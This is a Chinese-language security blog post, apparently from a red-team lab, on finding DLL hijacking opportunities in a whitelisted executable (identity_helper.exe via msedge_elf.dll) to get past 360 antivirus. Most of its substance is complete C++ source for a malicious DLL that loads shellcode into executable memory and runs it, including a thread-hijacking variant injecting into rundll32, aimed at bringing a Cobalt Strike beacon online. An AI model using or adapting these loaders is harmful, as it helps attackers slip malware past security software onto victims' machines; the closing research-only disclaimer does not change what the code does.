<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/NqpZyIKg3FvrnotWzz06kg)

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/4136w7o9JvdR1MV7XfPXTzAIrfzPe7aiaD5HD7vX1XU8yZRwdYCuicepLNGiaSJhEjN9RVOicibomzEYe1qicibQiciaK9A/640?wx_fmt=gif&from=appmsg)

**点击蓝字 关注我们**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/4136w7o9JvdR1MV7XfPXTzAIrfzPe7aiaJamk2Y9cpuVcUqEoTvPGa66SYlshxIejpz07NrELAic3ibYdco3QVEmg/640?wx_fmt=png&from=appmsg)

* * *

> 日期：2024/08/15
> 
> 作者：Corl
> 
> 介绍：DLL 劫持挖掘。

* * *

0x00 前言
-------

白加黑的方式（`DLL`劫持）可以对抗`360`核晶，白就是此文件在杀软的白名单中，不会被杀软查杀，黑就是我们自己编写的带恶意代码的`dll`文件，那么怎么进行白加黑的挖掘呢？

0x01 DLL 劫持原理
-------------

首先来理解`DLL`在`Windows`系统中的作用，`DLL`全称`Dynamic Link Library`，称为动态链接库，在`Windows`系统中，大多数程序并不是一个单独的可执行文件，而是有一些单独的存放动态链接库在系统中，当需要某些功能时，通过`DLL`执行相应的功能，即`DLL`调用。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/4136w7o9JvdR1MV7XfPXTzAIrfzPe7aia7ZrJHEqLToTyYzEHdSmOdx4exCrVAaaj23kDpZarM549pGJ1ha8icug/640?wx_fmt=png&from=appmsg)

那么既然程序执行某些功能时，可能会通过`DLL`调用，从利用角度来看，如果替换了这个`DLL`文件，或则导出了原`DLL`的导出函数并恶意构造，在原程序运行时调用了我们预先构造好的恶意`DLL`，那么就达到了劫持的效果。

0x02 DLL 加载顺序
-------------

`Windows 7`之后：微软为了更进一步的防御系统的`DLL`被劫持，将一些容易被劫持的系统`DLL`写进了一个注册表项中，那么凡是此项下的`DLL`文件就会被禁止从`EXE`自身所在的目录下调用，而只能从系统目录即`SYSTEM32`目录下调用。`KnownDLLs`列表，注册表查询如下：

```
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs"

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/4136w7o9JvdR1MV7XfPXTzAIrfzPe7aiaFYoibZwic1kKdL0NPCOLo8wh4pgpZb4BK9yj5SVKpmMhoXq9YBZhJeIw/640?wx_fmt=png&from=appmsg)

加载顺序：

```
1.EXE所在目录
2.当前目录
3.系统目录（C:\Windows\System32目录）
4.Windows目录（C:\Windows）
5.环境变量PATH所包含的目录

```

0x03 Dll 劫持挖掘
-------------

首先，把想要劫持的`exe`拖到一个空的文件夹中。如果想查看所加载的`dll`，最简单的方法就是直接去双击`exe`，如果缺少`dll`，那么就会进行弹框提示，但是这种方法并不可以找到全部所加载的`dll`文件。双击运行`identity_helper.exe`，会提示找不到`msedge_elf.dll`。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/4136w7o9JvdR1MV7XfPXTzAIrfzPe7aia5FPbH4NsckDyYk8dzicnPLpib0XA0Aogsj0KJiaxHyNvjmPbPOS4YelBw/640?wx_fmt=png&from=appmsg)

第二种方法就是使用`process Monitor Filter`，该工具可以看到运行该`exe`所加载的全部`dll`文件。运行`process Monitor Filter`工具，添加过滤条件。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/4136w7o9JvdR1MV7XfPXTzAIrfzPe7aia6ICbzMzvd1ibmyQfMQxSSmlYMGnO9WYrbQTYmBr9pbcuX4W4wE4AdRA/640?wx_fmt=png&from=appmsg)

对`identity_helper.exe`进程进行监控，重点关注程序所在目录的`dll`，可以看见缺少`msedge_elf.dll`、`dbghelp.dll`、`WINMM.dll`。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/4136w7o9JvdR1MV7XfPXTzAIrfzPe7aiae4X7YoFXkzKgwWquBlpicxXkZvSiaKuMtYE3lk69WfGuEicoGYbWCuWvA/640?wx_fmt=png&from=appmsg)

使用`CFF Explorer`工具，打开`identity_helper.exe`，查看文件位数以及导入目录。这里以劫持`msedge_elf.dll`为例，点击`msedge_elf.dll`就可以看到该`dll`存在`GetInstallDetailsPayload`、`SignalInitializeCrashReporting`导出函数。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/4136w7o9JvdR1MV7XfPXTzAIrfzPe7aiav1xgWvN5iaQQCK9oVMS5xvqgf6U1Tb8rZUxiaIaDcj6Yeb9RO13DJBog/640?wx_fmt=png&from=appmsg)

自定义`GetInstallDetailsPayload`、`SignalInitializeCrashReporting`函数。

```
extern "C" __declspec(dllexport) void GetInstallDetailsPayload(){}
extern "C" __declspec(dllexport) void SignalInitializeCrashReporting() {}

```

使用`MessageBox`进行弹框，看看该`exe`是否使用了该函数，如果使用了该函数，那么程序运行的时候就会弹框。分别在`GetInstallDetailsPayload`、`SignalInitializeCrashReporting`、`dllmain`中添加。

```
MessageBox(NULL, TEXT("1"), TEXT("1"), MB_OK);
MessageBox(NULL, TEXT("1"), TEXT("2"), MB_OK);
MessageBox(NULL, TEXT("1"), TEXT("3"), MB_OK);

```

代码如下：

```
// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include <Windows.h>
extern "C" __declspec(dllexport) void GetInstallDetailsPayload(){
    MessageBox(NULL, TEXT("1"), TEXT("1"), MB_OK);
}
extern "C" __declspec(dllexport) void SignalInitializeCrashReporting() {
    MessageBox(NULL, TEXT("1"), TEXT("2"), MB_OK);
}
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH: {
        MessageBox(NULL, TEXT("1"), TEXT("3"), MB_OK);
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

```

可以看出首先运行的是`dllmain`中的，然后再是`GetInstallDetailsPayload`，其次是`SignalInitializeCrashReporting`。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/4136w7o9JvdR1MV7XfPXTzAIrfzPe7aiaspPJkNHJicUibl6sZicfzxwyTQD9vm9chD4FmKibsA0DCacyMZMyPTudKg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/4136w7o9JvdR1MV7XfPXTzAIrfzPe7aiaeBJrxt8jMqMTJicrnVoOg0OJK2t9VsHRcd5mmdo5dlibBKpLpk5b05icw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/4136w7o9JvdR1MV7XfPXTzAIrfzPe7aiarGTy26JQGx2O3k1VrxmGo3yJuZAz2Cy26F6JHGITyWrV710rLUfKnA/640?wx_fmt=png&from=appmsg)

既然在`dllmain`和`GetInstallDetailsPayload`、`SignalInitializeCrashReporting`中都会执行，首先在`dllmain`中添加恶意代码，进行上线测试。

```
    unsigned char payload[] = {shellcode};
    void* p = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(p, payload, sizeof(payload));
    EnumFontsW(GetDC(NULL), NULL, (FONTENUMPROCW)p, NULL);

```

双击运行`identity_helper.exe`，可见`identity_helper.exe`已经在运行中了。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/4136w7o9JvdR1MV7XfPXTzAIrfzPe7aia1xGib92cgFozlBcnNTojF575HxnGk0YBaZsib11xrjpgicYNcIXXSXwng/640?wx_fmt=png&from=appmsg)

但是`cs`并没有上线，为啥呢？？？

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4136w7o9JvdR1MV7XfPXTzAIrfzPe7aiaCLcTAA7UhsjsKJ4JulibIR4pNAQtBIfzS6hQbgiaNK3YXTeSUqEtnCyw/640?wx_fmt=jpeg&from=appmsg)

因为`dllmain`存在死锁问题，那么怎么解决`dllmain`死锁问题呢，就是使用导出函数上线。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/4136w7o9JvdR1MV7XfPXTzAIrfzPe7aiaRMxWJYFmZ5jHI8wSHk9JhIicsdyhuWtSNnVafbFjPMFCJ0H6GLbK35A/640?wx_fmt=png&from=appmsg)

把恶意代码复制进`GetInstallDetailsPayload`函数中，运行`identity_helper.exe`成功上线。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/4136w7o9JvdR1MV7XfPXTzAIrfzPe7aiaV98pOXAsD2zDVlfIdVF6ZrCLmXJg4eJHSl16AwUoTy8RiaVYFk8kf4A/640?wx_fmt=png&from=appmsg)

完整代码：

```
// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include <Windows.h>
extern "C" __declspec(dllexport) void GetInstallDetailsPayload() {
    unsigned char payload[] = {shellcode};
    void* p = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(p, payload, sizeof(payload));
    EnumFontsW(GetDC(NULL), NULL, (FONTENUMPROCW)p, NULL);
}
extern "C" __declspec(dllexport) void SignalInitializeCrashReporting() {}
BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH: {}
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

```

那么，除了使用导出函数上线，`dllmain`就没有办法上线了吗？？？

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4136w7o9JvdR1MV7XfPXTzAIrfzPe7aiacUKvpicLIVeTCUyuCB01aPj5SKSuFzVyDiaUb6ZWsda0eeEL8oPCZbeg/640?wx_fmt=jpeg&from=appmsg)

这肯定不是的，如果要想使用`dllmain`进行上线，可以使用进程注入或线程劫持的方式上线，但都不是在原进程上线。这里采用线程劫持的方式上线的方式上线，`x64`劫持的就是`rip`，`x86`劫持的就是`eip`, 劫持的进程为`rundll32`。

```
// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include <Windows.h>
extern "C" __declspec(dllexport) void GetInstallDetailsPayload() {
}
extern "C" __declspec(dllexport) void SignalInitializeCrashReporting() {}
unsigned char payload[] = {shellcode};
SIZE_T payload_len = sizeof(payload);
BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH: {
        STARTUPINFOA si = { 0 };
        si.cb = sizeof(si);
        PROCESS_INFORMATION pi = { 0 };
        CreateProcessA(NULL, (LPSTR)"rundll32", NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
        SuspendThread(pi.hThread);
        LPVOID Buffer = VirtualAllocEx(pi.hProcess, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        WriteProcessMemory(pi.hProcess, Buffer, payload, payload_len, NULL);
        CONTEXT ctx = { 0 };
        ctx.ContextFlags = CONTEXT_ALL;
        GetThreadContext(pi.hThread, &ctx);
        ctx.Rip = (DWORD64)Buffer;
        SetThreadContext(pi.hThread, &ctx);
        ResumeThread(pi.hThread);
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/4136w7o9JvdR1MV7XfPXTzAIrfzPe7aiayEWhiaKCWDnjzibteb3zr2PTM0vBxYvYRYKjNjsK93qHeDFTShogI7Tg/640?wx_fmt=png&from=appmsg)

0x04 总结
-------

`DLL`劫持上线分为两种，一种是`dllmain`上线，但是会存在死锁问题，要想在`dllmain`上线，可以使用进程注入或线程劫持的方式，另一种就是导出函数上线。除了手动去进行挖掘`DLL`劫持，那么还可以尝试使用工具去进行挖掘，最后祝大家挖到好用的白加黑。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4136w7o9JvdR1MV7XfPXTzAIrfzPe7aiaFuicQbZCfPtIk5D6RTyrkwz5L0ryOurrmy8BBNZw3zfH35tVavy9TGw/640?wx_fmt=jpeg&from=appmsg)

**免责声明：本文仅供安全研究与讨论之用，严禁用于非法用途，违者后果自负。**

点此亲启

**ABOUT US**

**宸极实验室**隶属山东九州信泰信息科技股份有限公司，致力于网络安全对抗技术研究，是山东省发改委认定的 “网络安全对抗关键技术山东省工程研究中心”。团队成员专注于 Web 安全、移动安全、红蓝对抗等领域，善于利用黑客视角发现和解决网络安全问题。

团队自成立以来，圆满完成了多次国家级、省部级重要网络安全保障和攻防演习活动，并积极参加各类网络安全竞赛，屡获殊荣。

对信息安全感兴趣的小伙伴欢迎加入宸极实验室，关注公众号，回复『招聘』，获取联系方式。

![图片](https://mmbiz.qpic.cn/mmbiz_svg/YCOL3hU8ffUqCzyREqVSq3AFOuib0FwZVRlWXWOXsYozHV0XiaYJVGoTian40eVZcGbhUIs9Vltp8YCicncMWEVm9XUSIP0Bj3cA/640?wx_fmt=svg)